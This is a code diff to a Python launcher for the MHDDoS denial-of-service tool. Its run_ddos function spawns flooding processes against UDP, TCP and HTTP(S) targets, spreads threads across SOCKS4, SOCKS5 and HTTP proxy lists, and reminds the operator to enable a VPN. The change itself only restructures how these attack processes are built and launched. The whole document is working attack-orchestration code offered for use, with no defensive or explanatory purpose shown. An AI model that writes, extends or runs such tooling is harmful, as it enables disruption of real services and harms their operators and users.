@@ -40,22 +40,17 @@ def calculate_threads(total_threads, total_targets):
 def run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, no_proxies, debug):
     os.chdir('MHDDoS')
 
-    debug = 'debug' if debug else ''
     if no_proxies:
         s4_threads, s5_threads, http_threads = 0, 0, 0
     else:
         s4_threads, s5_threads, http_threads = calculate_threads(total_threads, len(targets))
 
-    processes = []
+    params_list = []
     for target in targets:
         # UDP
         if target.lower().startswith('udp://'):
             print(f'Make sure VPN is enabled - proxies are not supported for UDP targets: {target}')
-            process = subprocess.Popen([
-                'python3', 'start.py', 'UDP', target[6:],
-                str(udp_threads), str(period), debug
-            ])
-            processes.append(process)
+            params_list.append(['python3', 'start.py', 'UDP', target[6:], str(udp_threads), str(period)])
 
         # TCP
         elif target.lower().startswith('tcp://'):
@@ -63,11 +58,9 @@ def run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, no_
                 ('4', 'socks4.txt', s4_threads + http_threads // 2),
                 ('5', 'socks5.txt', s5_threads + http_threads // 2),
             ):
-                process = subprocess.Popen([
-                    'python3', 'start.py', 'TCP', target[6:],
-                    str(threads), str(period), socks_type, socks_file, debug
+                params_list.append([
+                    'python3', 'start.py', 'TCP', target[6:], str(threads), str(period), socks_type, socks_file
                 ])
-                processes.append(process)
 
         # HTTP(S)
         else:
@@ -77,11 +70,15 @@ def run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, no_
                 ('1', 'http.txt', http_threads),
             ):
                 method = random.choice(http_methods)
-                process = subprocess.Popen([
-                    'python3', 'start.py', method, target, socks_type,
-                    str(threads), socks_file, str(rpc), str(period), debug
+                params_list.append([
+                    'python3', 'start.py', method, target, socks_type, str(threads), socks_file, str(rpc), str(period)
                 ])
-                processes.append(process)
+
+    processes = []
+    for params in params_list:
+        if debug:
+            params.append('true')
+        processes.append(subprocess.Popen(params))
 
     for p in processes:
         p.wait()
